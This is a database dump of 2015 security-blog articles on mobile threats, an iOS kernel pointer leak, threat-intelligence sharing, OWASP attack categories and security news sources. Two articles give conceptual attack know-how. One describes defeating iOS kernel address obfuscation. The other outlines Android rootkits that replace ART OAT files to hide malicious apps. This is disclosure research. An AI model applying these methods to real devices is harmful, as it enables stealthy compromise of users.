HIPAA-compliant, it is important for health care companies to develop strong security policies to manage and monitor the devices that have access to their corporate networks and data. Protecting users requires passwords, controlled user access to data and communicating sound security best practices, but more must be done.\n Considering the rise of sophisticated malware and phishing attacks targeting organizations’ mobile infrastructure, deploying a protective solution that can identify, prevent and remediate mobile threats is now critical. By using a layered mobile security solution such as   on top of the existing EMM platform, health care organizations can safely and securely support mobile devices within their mobile environment, proactively manage malicious mobile threats in real time and reduce the risk of sensitive data leaks featuring corporate and/or personal information.\n With   already costing hospitals more than $12 billion annually and a serious hit in the consumer trust arena, health care organizations cannot afford to take a lax approach to securing the incredibly sensitive personal information of their customers. While the   is not keeping pace with mobile device security, organizations should act quickly to remediate this before it’s too late. Otherwise, they risk being the latest victim of cyberattacks and take their customers down with them.\n Image Source:', '\'Bring-Your-Own-Device (BYOD)\', \'Enterprise Mobility Management (EMM)\', \'Healthcare Fraud\', \'Healthcare Industry\', \'Healthcare Security\', \'Mobile Device Management (MDM)\', \'Mobile Security\'', 'https://securityintelligence.com/medicating-health-cares-mobile-malware-maladies-with-threat-management/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (429, 'CVE-2015-1097: Deobfuscating iOS Kernel Pointers With an IBM X-Force-Discovered Vulnerability', 'David Kaplan', '2015-4-21', 'In January, Barak Gabai of the X-Force Application Security Research Team discovered an interesting information leak vulnerability in iOS IOKit IOMobileFramebuffer (CVE-2015-1097), which can be used to defeat the kernel address obfuscation mechanism available since iOS 6. The vulnerability was disclosed to   and has been fixed in iOS 8.3. In this blog post, I will provide a brief overview of the kernel address obfuscation technique employed by iOS and show how Gabai’s vulnerability renders it ineffective, as is the case with similar memory disclosures. I will also briefly touch on what I believe makes this particular   uniquely interesting. The iOS kernel address obfuscation is excellently described in full in the “mach_port_kobject() and the kernel address obfuscation” blog post by  . Readers unfamiliar with this security mitigation mechanism and techniques for defeating it are encouraged to first read Esser’s post. On iOS, the kernel address space is randomized. C++ objects on the kernel heap are juicy targets for exploiters, and they can often be used for arbitrary code execution. In some circumstances, the kernel — such as via mach_port_kobject() prior to iOS 8.1.3 — can provide an address of a kernel object to a user-space caller. Should the address of these objects be provided directly to user-space, exploitation would be assisted because an attacker — such as a malware author or jailbreak developer — could know where exploitable heap objects were situated in the kernel heap. Therefore, in recent versions of the kernel, these addresses are not passed to user-space in the clear and are instead obfuscated. In order to perform this obfuscation of kernel-space addresses prior to being exposed to user-space, the addresses are passed through the  , which is defined as follows: As we can see, the code takes the kernel-space address and adds a vm_kernel_addrperm value to it. This permutation constant is a random value that is generated on boot.   has been published on the strength of this permutation constant, and I’m not going to go into how the vm_kernel_addrperm value is generated in this blog post. However, for the purposes of this discussion, let’s assume Apple has managed to generate a permutation constant of sufficient entropy. If all the above worked as it should, it would be difficult to attack the interesting objects situated on the kernel heap. However, in order to defeat this mechanism, we can make use of the invertible nature of the obfuscation function in order to deobfuscate the kernel address. The kernel is able to do so because it already knows vm_kernel_addrperm. So if we would like to do the same, we would ideally like to discover vm_kernel_addrperm. For the function itself, we can see the following: So if we manage to find a leak of addr_clear (or any address from which we can reliably calculate the offset), we can then render the entire obfuscation mechanism useless. Such   have been demonstrated in the past. Gabai discovered that the (unobfuscated) address of the IOMobileFramebuffer object on the kernel heap is inadvertently being leaked to user-space by a member function. In my opinion, what makes this particular leak interesting is the mechanism of the leak itself. The vulnerability can basically be summarized as follows: The ‘get_framebuffer_id’ method (selector 7) of IOMobileFramebufferUserClient calls a member method of IOMobileFramebuffer and passes the return value of the call to user-space. In the standard ARM calling convention, the R0 register is used both to pass the first argument to the function and to hold the return value on the function return. In our case, the first argument (placed in R0) is the pointer of the IOMobileFramebuffer object itself. In this instance, the called method is, in fact, ’empty’ — a nullsub. Therefore, as the caller expects the return value to be in R0 — and the nullsub simply doesn’t touch R0 — the return value is the persisted value of R0, the object pointer. This is then further persisted to user-space, and hence, we have our information leak. The most likely reason in the case of C++ is that an empty virtual function of a base class has been called instead of the derived class function. In such a case, the return register, as defined by the calling convention, will persist in its value. In C++, the first argument is the pointer of the object itself (the ‘this’ pointer). Depending on the calling convention, such as in the case of the standard ARM calling convention, it’s even possible that this object pointer is what will be present in the return register, then the function returns. Another reason could be that code may have been #if{,def}’d out. This pattern is sometimes seen with debug code, which is to be removed in release builds. In such a case, it is possible that compiler optimizations could remove the function altogether. Based on some minor experimentation I performed with both GCC and Clang at varying optimization levels, it’s entirely possible nullsubs could be left in the code. Also, by default, GCC doesn’t warn about control reaching the end of a non-void function, whereas Clang does. Any instance where control from a non-void function can return without a return value is potentially dangerous, and developers should take care to eliminate such instances from their code. While   need to be aware of how the code looks in a high-level language, they should think about what’s happening  , as well.', '\'Apple\', \'Cybersecurity\', \'IBM X-Force Research\', \'iOS\', \'Mobile Security\', \'Vulnerability\', \'X-Force\'', 'https://securityintelligence.com/cve-2015-1097-deobfuscating-ios-kernel-pointers-with-an-ibm-x-force-discovered-vulnerability/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (430, 'Transparent Hat Hackers: Hacking Outside the Box', 'Oded Margalit', '2015-4-20', 'Most people are familiar with the concept of white hat hackers and black hat hackers, who are separated along ethical lines. Black hat hackers violate   for the wrong reasons, while   do it for ethical reasons, such as showing the world some systems are not secure enough. There are actually several other types of “hats,” as well, such as gray hats (in between white and black) and green hats (newbies). Today, I’d like to introduce another type of hat: a transparent hat. Hacking requires a deep understanding of computer systems. Hackers must understand the hardware level, have intimate knowledge of the system and have special, esoteric skills, such as being able to write assembly language programs under special constraints or understanding obfuscated programs. Transparent hat hackers do not hurt computer systems for malicious causes, nor do they do it for the right cause. In fact, they do not hurt any systems at all. Instead, transparent hat hackers design and solve difficult mathematical problems that are related to the cyberdomain and enhance their abilities in ways that would help  . Let me provide some examples. Thinking outside the box, here is a program I wrote for the IEEEXtreme 5.0 competition: Given a seven-digit number, make an exercise from it whose result is 100. You may use the four basic math operations and parentheses between digits such that the result is a valid exercise whose result is 100. Note that you must use all the digits, keep the order of the digits and you are not allowed to combine several digits into a number. Thus, the solutions “5x5x4,” “5x5x4+0x1x5x5” and “5x(5+5+1+0)+45” are not valid for the number 5551045, while the solution “5x(5+5+1+0+4+5)” is. Your task is to write a program that, given a seven-digit decimal number, finds an exercise whose result is 100. You must keep the original digits in order and add characters from the following six-character alphabet: “+-x/().” So far, it is a straightforward task that requires some programming skills and some optimization to solve it fast enough. However, here comes the interesting part — the validity is checked using the following script: [expand title=”Click to see the answer”] A zero exit code is considered a valid solution. If you pay close attention to the scoring script, for example, you would see a way to fool it and solve the input “5750004,” which is unsolvable by the definition above but solvable by tricking the script. [/expand] What does the following program do? [expand title=”Click to see the answer”] This 81-bytes-long 8086 assembly program can run on a Dos-Box and demonstrates some card magic. Can you understand it? [/expand]   The task here is to beat the robots in this shooting game. Download the game, run it and try to win.  [NOTE: Clicking this link will start a program download] Solving a math exercise (Example No. 1), reverse engineering card tricks in assembly (Example No. 2) or finding bugs in a computer game (Example No. 3) does not directly cause any harm to a computer system, doesn’t hurt anyone’s privacy, is not considered a crime and even isn’t considered to be a zero-day exploit. However, these exercises do teach you the skills needed for hacking. Example No. 1 shows you how to think outside the box and bend the rules of the system, while Example No. 2 shows you how to reverse engineer packed code that uses undocumented Microsoft operating system interrupts and appreciate the compression of data into code. Example No. 3 shows you how to look for common programming errors that tend to appear in real-life software and create security problems used by all types of hacking experts. And taken all together, these 3 examples reveal that hackers may not necessarily wear either white or black hats.', '\'Black Hat\', \'Hacking\', \'Security Intelligence\', \'White Hat\'', 'https://securityintelligence.com/transparent-hat-hackers-hacking-outside-the-box/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (431, 'The Path Forward With Threat Intelligence and Sharing', 'Doron Shiloach', '2015-4-16', 'According to Gartner’s  , threat intelligence is defined as “evidence-based knowledge, including context, mechanisms, indicators, implications and actionable advice about an existing or emerging menace or hazard to assets that can be used to inform decisions regarding the subject’s response to that menace or hazard.” While this definition is fairly new, the concept of threat intelligence has been around for as long as security professionals have looked for information to help their investigations by detecting and preventing attacks such as compromised systems and data exfiltration. From this perspective, one source of threat intelligence is the company’s internal networks. Another is the vast amount of information that exists outside that system, such as information collected by honeypots, spam traps, Web crawlers specialized for identifying malware and monitoring hacking forums. In the past few years, threat intelligence has started to mature from a marketplace and security user perspective in terms of how to best gather, organize, share and identify sources of threat intelligence. Sharing is one of the most exciting aspects of threat intelligence, as companies recognize that   is important, and   emerge to make it easier and faster to share information. With that, threat intelligence feeds and platforms have emerged as a new market for these products and services. \n  isn’t new;   have been doing it for decades without legislation. This revelation refers to the recent announcement of a new  , and unfortunately, it’s true. While this is a significant step for coordinating and sharing cyberthreats in the government space, attackers are quite comfortable sharing and exchanging information, whether on malware techniques or the latest breaches. Now that the good guys are similarly looking at   as an imperative duty, we are faced with the task of identifying the means by which the industry can best enable effective collaboration. People must have access to the right type of threat intelligence for their organization that fits into their existing frameworks for social networking so they can quickly benefit from the exchange of information in ways that help their organization. The openness in threat intelligence sharing comes from the availability of the information itself and the means by which users can obtain that information. With threat intelligence, there is both significant breadth and depth of information that is important to users. As an example of the breadth of information, the most common indicators include IP addresses, domain names, URLs, registry settings, email addresses, HTTP user agents, file hashes and file names. There is depth of information associated with each of these, such as the historical context, as well as the pivoting between them to allow for the real understanding of how they relate to each other. This can lead to insights on tactics and techniques. Given the variety of information and its dynamic nature, as a consumer of threat intelligence, this information should be the most comprehensive, highest-fidelity and most up-to-date content possible. Aside from the information itself, there is also the platform with which users obtain and share that information, enabling collaboration in a social manner. Social networking first began to appear in 1994, when GeoCities was created. Social media has evolved significantly since then. While that site and some of the others that followed (theGlobe.com and Friendster) were not necessarily commercially successful, they all helped foster a level of comfort when interacting with other users on the Internet. Tools such as forums, user profiles, bookmarking, curation and wikis are now so second nature to us that we’ve forgotten they were once new and innovative. The sharing of threat intelligence should also build on these tools while still adapting and extending them in new ways that can provide new capabilities, specific to the security use cases. For example, the established concepts of controlling with whom we share which pieces of information is an essential aspect of any collaborative platform. Building specific constructs for the curation and organization of information for security use cases can further extend an existing capability. The sharing of threat intelligence should ultimately lead to tactical actions that help organizations further protect their users and infrastructure. To reiterate, because the stakes are much higher with  , it is important to have a seamlessly flowing process. For example, providing additional context on an indicator that has been brought to a user’s attention, whether from a security tool or another user, helps the user make a decision on how to further use that information. Extending this to action naturally leads to programmatic access and application programming interface integration, which helps organizations make better and quicker decisions. Threat intelligence has become an essential aspect of any organization’s security program. The sharing of that threat intelligence to further enhance and gain value from it will increasingly become the norm. Today, X-Force is launching a new cloud-based threat intelligence platform,  , to help encourage and facilitate the sharing of threat intelligence while addressing the principles of open, social and actionable sharing. Learn more by   or reading the  .', '\'Cyber Threat Intelligence Integration Center (CTIIC)\', \'Cybersecurity\', \'Data Security\', \'Government\', \'Malware\', \'Security Intelligence\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/threat-intelligence-and-sharing/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (432, 'Hiding Behind Android Runtime', 'Paul Sabanal', '2015-4-15', 'On March 27, I gave a   at Black Hat Asia 2015 in Singapore. My session highlighted possible ways to create user-mode rootkits by taking advantage of Android’s new runtime, based on publicly disclosed Android OS code and not leveraging vulnerabilities. First, let’s talk about a typical attack scenario. An attacker will first attempt to gain access to the device by exploiting a vulnerability or by tricking the user into installing  . If successful, the attacker would have gained access with the privilege of the exploited program or of a normal app in the case of a malware install. While this is often enough to conduct some malicious operations, a higher privilege will enable the attacker to do more. The attacker would have to use another exploit to elevate his or her privileges, with gaining root privileges as the ultimate goal. However, this root access (soft root) is not persistent and will be lost when the device is rebooted. To overcome this, the final step is to make sure the attacker maintains root access even after a reboot and can hide his or her traces. This is typically achieved by installing a rootkit. It is in this stage of the attack where this research comes in. One of the main motivations for this research is to determine whether an attacker who wants to install a rootkit can do so without having to deal with the complications brought on by some recent advancements in Android  , specifically a feature called  . First introduced in KitKat, this feature allows the kernel to verify the integrity of a partition upon a boot, thus ensuring this partition has not been tampered with. It protects the device from rootkits that add or modify binaries in the system partition to hide other malicious files and processes and maintain access. While dm-verity is not yet a default feature, it’s always good to know early on what an attacker can do in spite of the protections in place. As a team, we needed to see whether it was possible to conduct rootkit operations without touching the system partition, thus avoiding the protection offered by dm-verity. To answer these questions, we turned to another technology that has been recently introduced in Android: the new  . ART was first introduced in   in October 2013 as an experimental alternative to the Dalvik runtime. Upon the release of Android Lollipop 5.0 in November 2014, ART became the default runtime. The main advantage of ART over Dalvik is better app performance due to ahead-of-time compilation. While Dalvik relied on interpretation and just-in-time compilation, ART precompiles app Dalvik bytecode into native code. The command responsible for compiling an application into OAT is dex2oat, which can be found in /system/bindex2oat. This ahead-of-time compilation will result in an OAT file that is generated in the /data/dalvik-cache// directory, where arch is the name of the device’s central processing unit architecture (e.g., “arm” for ARM, “x86” for Intel x86, etc.). All apps will be compiled every time the device’s system is upgraded or the first time it is booted up after it is purchased. During this time, ART will also compile all the code from the Android framework jars into a single OAT file named boot.oat. This boot.oat file is referenced by an app whenever the app calls a framework application programming interface (API) method. Individual apps are compiled upon installation and upon subsequent updates. The approach I took was to take advantage of the mechanisms of ART to modify the framework or application code with code of our own without touching the system partition. We can use dex2oat to generate OAT files from modified versions of installed apps or system frameworks and replace the original OAT files with them. Note that we need at least a root shell access (soft root) to do this. We have the two following options: There are several advantages to this approach. One is that we don’t have to deal with low-level code. All our modifications are done in Java and only run in the user mode, so there will be fewer potential problems to be encountered compared to code that deals with low-level kernel stuff. This approach is also affected less by variations in architecture and OS versions since we rely on ART itself, specifically the dex2oat tool, to generate our code. Last, with this approach, we don’t have to deal with code signing since the applications were already installed and verified. All we do is modify the app’s code that is now outside the application’s package. Our code also runs under the context of the affected app. This means our code will have the same user ID and app permissions as the app running our code. For instance, if we use the app OAT-replacing technique and replaced the OAT for the Settings app, our code will run in the context of the system user, along with the app permissions of the Settings app. How about persistence? As long as our modified OAT file is in use, our modification will stay in effect. The OAT files will only be replaced after an OTA update or app update. Upon the OS update, boot.art and boot.oat will have to be regenerated and all the app OAT files will have to be recompiled, as well; likewise, it must be recompiled when an app is updated. Keep in mind that our goal is not to maintain root access, since we are trying to avoid writing to /system in the first place. We do not have the option to re-exploit the device using a system-to-root exploit while our code is running as system UID. Using these techniques, we can create user-mode rootkits that hide malicious apps and processes that we have installed on an Android app running on  . We can do this without modifying any of the files in the system partition. Again, no vulnerabilities were used, and these techniques assume the attacker already has root access. In other words, a malicious Android app cannot use this approach without elevating its privileges through a   or social engineering. If you want more details about this research, check out this   and the   from the Black Hat website. Image Source:', '\'Android\', \'Android Security\', \'Cybersecurity\', \'Mobile\', \'Mobile Security\', \'Rootkit\'', 'https://securityintelligence.com/hiding-behind-android-runtime/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (433, 'RSA Conference: Six Must-Attend Sessions for CISOs', 'Christopher Burgess', '2015-4-14', 'The   is considered a must-attend event for all chief information security officers (CISOs). It is not only an opportunity to meet and network with other  , but it also lets you engage with a wide range of thought leaders in the security industry. Many of these thought leaders are attending the conference for the sole purpose of sharing knowledge and experiences with their colleagues. While it is impossible to attend all the conference’s great educational sessions given the multiple tracks, the following are six sessions that will help CISOs improve their role and better attend to their responsibilities:\n CISOs who are new to their role may wish to invest their time and attend “ ,” a four-part session that includes a diverse group of CISOs and compliance and privacy executives sharing their experiences. The following are the four parts of the session:\n All CISOs must surround themselves with the best security talent available and ensure all members of the workforce are involved in addressing cybersecurity threats in order to be successful. According to IBM CISO  , IBM has a multipronged approach to finding talent. The company hires individuals with well-polished technical skills and then trains them in-house in the security disciplines. IBM has also partnered with universities to evolve their curricula with an emphasis on cybersecurity.\n The panel session “ ” will go a long way toward ensuring a better understanding of the unique challenges and opportunities that come with building the next generation of cybersecurity professionals. The panel, moderated by Michael Kaiser, executive director of the National Cyber Security Alliance, includes the following speakers:\n Data and application security in the   — private, public or hybrid — is top of mind for every CISO. The RSA Conference includes the session “ ,” which is co-presented by Christopher Hoff, vice president and security chief technology officer of Juniper Networks, and  , analyst and chief executive officer for Securosis, LLC. The session will address the technical evolution of cloud computing and emphasize how early cloud security models are being replaced by the drive to containerization.\n How complex is your supply chain? Is every link in the supply chain afforded the same level of security? Will the Internet of Things affect your  ? “ ” is a panel discussion on why you need a strong supply chain cyber risk management capability. The panel will be moderated by  , senior associate of Booz Allen Hamilton, with participation from  , chief technology officer of Chosen Plaintext,  , vice president and CISO of Samsung, and  , director of EG Global Supply Chain Product Cybersecurity, HP.\n If you have an international footprint, you’ll want to attend “ ,” a panel discussion moderated by  , chief strategist of CSG Invotas. Participants will include  , CISO of PSCU,  , global co-chairman of DLA Piper’s Data Protection, Privacy and Security and Cybersecurity practices, and  , president and chief executive officer of the Internet Security Alliance. The panel is expected to highlight the growing complexities of cyber regulations around the world and discuss why organizations that have better knowledge on the regulatory penalties and initiatives available in any given environment are best positioned to balance risk.\n Boards of directors are expected to be kept abreast of risks, security concerns and the pathway to remediation and “de-risking.” As discussed in “ ,” CISOs must be able to communicate with the board in a language both sides can understand. This includes ensuring technical information is kept to a minimum, having your facts and numbers aligned and thinking and talking business. In the session “ ,” co-presenters Trey Ford and  , vice president of strategic services for Rapid7, will provide the results of a CISO study focused on reporting behaviors and what the board really wants to hear from the CISO.\n Enjoy the  , soak up all the information you can and share that acquired knowledge with your staff, peers and industry. Never has the phrase “knowledge is power” been more apropos.', '\'C-Suite\', \'Chief Information Security Officer (CISO)\', \'Cloud Security\', \'Cybersecurity\', \'Risk Management\', \'RSA Conference\', \'Security Intelligence\'', 'https://securityintelligence.com/rsa-conference-six-must-attend-sessions-for-cisos/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (434, 'Security Excellence: How an IBM Threat Response Team Took On the Waski Virus', 'Michael Sanders', '2015-4-13', 'In the security industry, we tend to emphasize prescriptions. We invest a lot of time talking about technologies, methodologies and practices that build a strong security posture and threat response capability. What we don’t talk about much is people, as if the skills, motivation and commitment of those who plan, manage and — perhaps most important in my view — monitor, detect and respond to security events don’t much matter. You might suppose the human factor in threat response and mitigation is just another commodity, such as office supplies or real estate. However, if you talk to chief information security officers, they will tell you at length about the challenges that come with trying to fill security jobs, developing people once they’re hired and retaining them. It goes beyond technical learning or industry certification. Instead, they’re looking for a proactive approach, a desire to collaborate with other teammates and a commitment to solving problems. These things can’t necessarily be taught. My experience tells me that teams matter. When led correctly, they develop a collective personality characterized by confidence, mutual support and continuous learning. For example, consider the way IBM’s Managed Security Services threat response team approaches its work by looking at how it handled the Waski virus last fall. Managers on the team became aware of an email directed at employees of an IBM client in the banking industry. The message, a typical   crafted to seem as though it came from a human resources executive, invited a reader to open a damaging attachment, a variant of   malware. This was a Trojan horse software that silently downloads and installs other programs capable of damaging systems and harvesting a client’s critical data. But rather than tell you more about this, let me show you a video we developed that’s a little different than our usual presentation. It’s a story that focuses on our team and its incredible response to the attempted breach of our clients. We’ve even supplemented it with a graphic novel about the event. Our response to the Waski malware not only demonstrated the value of a major-league  , but it showed how our recently introduced   service can get the right intelligence, alerts and response to clients. Our team’s wipeout of Waski served as a further proof point of IBM’s cybersecurity expertise and client value.', '\'Cybercriminals\', \'Cybersecurity\', \'Malware\', \'Security Intelligence\', \'Threat Response\'', 'https://securityintelligence.com/security-excellence-how-an-ibm-threat-response-team-took-on-the-waski-virus/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (435, 'Top Security Myths That Could Leave Your Organization Vulnerable to an Attack', 'Gretchen Marx', '2015-4-9', 'Every year, thousands of companies evaluate their current security posture and implement solutions to help fill gaps in their security programs. The following are four security myths that may keep your organization from moving to a higher level of security: Your company is infected; every company is getting attacked every day. What makes it so hard to find the attackers? They certainly don’t stand up and say, “Hi, I’m in your system.” Instead, they lie low for weeks — even months — until they’re ready to attack critical systems and steal your data. Or, they exploit vulnerabilities on Web-facing applications to quickly grab data before you realize what happened. There has been a focus on building layered security defenses for years. However, traditional security architectures and tools are failing in today’s threat landscape; they just can’t see the threats. In one study published by the Ponemon Institute, advanced attacks went undetected for an average of 225 days. The following are some ways you can you defend against advanced threats: Start looking into behavioral controls, advanced analytics, forensics capabilities and threat research to get ahead of the attacks on your company. All this protection has to apply across your entire infrastructure, from your networks and endpoints to your data and applications. It also has to apply in the data center, on physical devices, on virtual machines and in the cloud. Security is tough. There is a lot to protect and not enough budget to make it all happen. That’s why you should consider taking a risk-based approach. Organizations are buried in data, but according to one recent  , just 2 percent of the data in a company represents 70 percent of its critical assets, such as customer information, intellectual property, marketing plans and sales plays. Do you know where that information is? Have you identified it? Have you determined whether it is in structured or unstructured form, in the data center or on the cloud? This is crucial to really protecting your organization. Do you know who is accessing your  ? Some of those users, such as database administrators, have elevated privileges. How can you determine whether their actions, either malicious or inadvertent, are putting your data at risk? Based on a study performed by the  , the highest security risk is at the application layer. Yet organizations often focus on the network layer, allocating most of their resources and attention there. You are adding new Web and mobile applications on a weekly or possibly even a daily basis. Have you scanned every one of those apps for security holes? You need to provide protection not only to the data, but to applications that transform that data and the people who access and use it. Adopting a multilayered, risk-based defense can help you protect your critical assets in the data center and the cloud, provide extra protection for privileged users and identify vulnerabilities in Web, mobile and back-end production applications. With capabilities to discover, protect and monitor your data, applications and people, you can help ensure your organization is guarding the right assets at the right time from bad actors. It is not a question of if you will use cloud and mobile solutions, but when. The cloud provides the agility and flexibility to allow you to grow your IT capabilities at speed and scale while reducing costs. As cloud adoption grows, companies have more resources — applications, data and services — residing on different platforms; some run on public clouds, while others run on private clouds. The cloud can give you the opportunity to do security over and do it right with a diverse portfolio of services. Look for a vendor that has security capabilities that extend from the data center to the cloud so your security team can seamlessly manage both environments. You need to be able to manage user access, protect the data you’re moving to the cloud and identify vulnerabilities in new applications on the cloud, all while maintaining visibility across both the data center and the cloud. Mobile devices need protection for the device itself, for the content and applications on the device and for the transactions going from the device to your back-end systems. In short, work with a vendor who can help build security in from the beginning and wrap security around both cloud and mobile initiatives. Wouldn’t it be nice if you had access to information about what’s happening right now across the entire Internet? What’s happening to peers in your industry? What are the latest vulnerabilities? Businesses need to get better about  , because the bad guys sure are. Look for vendors who embed global threat information in their products and services, and take advantage of sharing resources throughout the industry. Without viable global threat information, your company is operating in the dark. At the same time, you may be challenged to find the right people to staff your security team: Almost 83 percent of companies report that they can’t find people with the needed security skills. Focus on the security controls for which you have in-house expertise, and look for help from a trusted partner to augment your team where you have gaps. Traditional security defenses are no match for today’s unrelenting, well-funded attackers. Organizations must avoid buying into these security myths and accelerate their ability to limit new risk and apply intelligence to stop attackers, regardless of how advanced or persistent they are. New analytics, innovation and a systematic approach to security are necessary. Forward-thinking organizations can establish a favorable risk posture that reduces the likelihood of costly exposures, liberating their budget for innovation and turning risk into opportunity.', '\'Advanced Threats\', \'Application Security\', \'Cloud\', \'Cybercriminals\', \'Cybersecurity\', \'Data Security\', \'Mobile Security\'', 'https://securityintelligence.com/top-security-myths-that-could-leave-your-organization-vulnerable-to-an-attack/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (436, 'The 10 Most Common Application Attacks in Action', 'Paul Ionescu', '2015-4-8', 'Nowadays, application development is moving more and more onto the Web. The Web hosts entire productivity suites such as Google Docs, calculators, email, storage, maps, weather and news — everything we need in our daily lives. Our mobile phones are useless without the Internet since nearly all mobile applications connect to the cloud, storing our pictures, usernames and passwords and private information. Even our home devices are now connecting to the Web, with   platforms such as Wink that allow users to dim their house lights right from their mobile phone. The application layer is the hardest to defend. The vulnerabilities encountered here often rely on complex user input scenarios that are hard to define with an intrusion detection signature. This layer is also the most accessible and the most exposed to the outside world. For the application to function, it must be accessible over Port 80 (HTTP) or Port 443 (HTTPS). In the diagram below, the Web application is completely exposed to the outside world in spite of network defenses such as firewalls and intrusion prevention systems: In 2014, SQL injections, a type of application attack, were responsible for 8.1 percent of all data breaches. That makes it the third most used type of attack, behind malware and distributed denial-of-service attacks. You will also find on the list other common application attacks such as security misconfiguration, using components with known vulnerabilities and  . Attackers were able to manipulate application input and obtain confidential data without being detected by network defense systems. Most vulnerabilities found in the proprietary code of Web applications are unknown to security defense systems; these are called zero-day vulnerabilities. This is because these vulnerabilities are specific to each application and have never been known before. A skilled attacker can easily find these vulnerabilities and exploit the issue without being detected. The best defense against these attacks is to develop secure applications. Developers must be aware of how application attacks work and build software defenses right into their applications. \n Educating and informing developers about application vulnerabilities is the goal of the Open Web Application Security Project (OWASP). The organization has put together a list of the 10 most common application attacks. This list is renewed every three years, with the latest refresh in 2013. The IBM Security Ethical Hacking Team shares this goal. With this in mind, we put together a video series that demonstrates attacks from each category from OWASP’s list. Each video includes information on how to prevent these attacks and how to use automated tools to test whether attacks are possible. These videos were initially intended for internal use but have now recently been made publicly available. So, without further ado, let’s start the countdown! This category of vulnerabilities is used in phishing attacks in which the victim is tricked into navigating to a malicious site. Attackers can manipulate the URLs of a trusted site to redirect to an unwanted location. Watch Jonathan Fitz-Gerald demonstrate this attack below: This category is about using unpatched third-party components. Attackers can easily exploit old third-party components because their vulnerabilities have been publicized, and tools and proof of concepts often allow cybercriminals to take advantage of these flaws with ease. Any script kiddie can conduct an exploit. In this video, you will see exploits of the famous   and Shellshock vulnerabilities: This type of attack is used in conjunction with  . It allows attackers to trick users into performing actions without their knowledge. In the video below, Brennan Brazeau demonstrates how an attacker can steal money from a victim’s banking account by leveraging social media — and pictures of cats: This category covers situations in which higher-privilege functionality is hidden from a lower-privilege or unauthenticated user rather than being enforced through access controls. Here, John Zuccato demonstrates an attack in which a lower-privilege user gains access to the administration interface or a Web application: This category deals with a lack of data encryption in transport and at rest. If your Web applications do not properly protect sensitive data, such as credit cards or authentication credentials, attackers can steal or modify the data to conduct credit card fraud, identity theft or other crimes. Moving into the top five, we’re exploring another extremely dangerous category of flaws that deals with the incorrect misconfiguration of the server or of the application itself. In this video Fitz-Gerald takes us through a demo of another vicious attack: path traversal. This type of insecure direct object reference allows attackers to obtain data from the server by manipulating file names. You’ll see how Fitz-Gerald patiently downloads file by file until the gets the whole database. Cross-site scripting is a type of vulnerability that lets attackers insert Javascript in the pages of a trusted site. By doing so, they can completely alter the contents of the site to do their bidding — for example, they could send the user’s credentials to some evil server. Warren Moynihan shows us how that can be achieved below: Brazeau discusses several types of programming flaws that allow attackers to bypass the authentication methods that are used by an application: As the all-time favorite category of application attacks, injections let attackers modify a back-end statement of command through unsanitized user input. Moynihan takes us through several examples of SQL injections, and he ends up making the application spit out the entire user table, including passwords.', '\'Application Security\', \'Cross-Site Scripting (XSS)\', \'Cyberattacks\', \'Cybersecurity\', \'Open Web Application Security Project (OWASP)\', \'Vulnerability\'', 'https://securityintelligence.com/the-10-most-common-application-attacks-in-action/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (437, 'How to Stay Up-to-Date on Security Trends', 'Koen Van Impe', '2015-4-7', 'The current computer security landscape is a rapidly evolving playground. Staying on top of all the security news, knowing the latest   and staying aware of changing threat information has become a difficult, time-consuming, daunting task. The way we organize, follow and share news has changed significantly in the past few years. In this article, I’ll describe how you can streamline the process of following different news and   channels, classify them and bring them to good use for you and your customers. The key to powering your news flow is selecting good content from a wide variety of sources and using technology that gives you easy access to the content. While the technology lets you access the content, it should not filter or limit your access. Some content sources provide more general news, while others focus on one or more specific areas. A number of these sources are community-driven, while others have ties to a specific brand. \n Keeping track of security alerts and advisories gives the necessary information for keeping your products up-to-date and preventing you from easily falling victim to vulnerability exploits. The following are some common resources: The feeds from CERT/CC and SecurityFocus provide alert and advisory data for the most commonly used products and should be checked up on daily. Combine this with the information from US-CERT, and you and your vendors should be able to closely follow what needs immediate attention or patches. There are several news sources that provide more depth on security topics and security investigations. They provide the necessary information on the latest security trends and are a key information provider for updated threat information. The following are some examples: When you want to limit the number of news sources you follow, subscribing to the feeds from CERT-EU and Reddit will already give you the most necessary topics. If your focus is on gathering threat intelligence, then paying attention to news from the blogs of F-Secure, Securelist and Trend Micro will prove valuable. They publish regular research on   with detailed detection indicators. You should also stay on top of new additions to the APTnotes GitHub repository and new exploit code published by Exploit Database. A number of security professionals cover news from their own personal point of view.   writes about all things that matter in security and   has in-depth security news and investigations, while   is Richard Bejtlich’s blog on digital security, strategic thought and military history. Some information is presented via videos and is both entertaining and interesting to follow, such as the following: The   and the   publish content that can be of use for regulatory topics and policymaking. Other sources include the following: The different information streams should be organized by what you plan on doing with the information afterward. Either it’s meant for immediate operational use or for intelligence use. The classification is also reflected later on in the type of tool used to access or store the content. The topics that are covered by the sources on alerts and vulnerabilities translate to things that must be acted upon. Depending on the severity of the notice, it can become something that requires immediate attention. The information that comes out of these sources has a great influence on day-to-day operation priorities. It also acts as input for configuring security devices. For example, you could be running a Web application and receive a notice from US-CERT about a new weakness in the application. The notice contains a description of how it is being abused. You can then schedule an upgrade cycle and configure your Web application firewall to block the attack pattern. Similarly, you can use the pattern as a new rule to look for information in your  . The information you get from sites covering threat intelligence is useful for feeding your own intelligence platform. It allows you to point out where your constituency should focus. It is also your starting point for conducting incident investigations and giving security advice to your customers. For example, consider that there is a document posted in your news stream that describes a new APT case that was discovered and investigated. The document describes the modus operandi of the attackers, their goal and how they gained access. Typically, if you get such a document, you evaluate whether it’s a threat for your customers. If so, you notify them by stating the high-level details of the cyberattack and the threat actors. From the same document, you can then extract the tactics, techniques and procedures used by attackers. Subsequently, you can add the different indicators, such as file hashes to look for, detectable 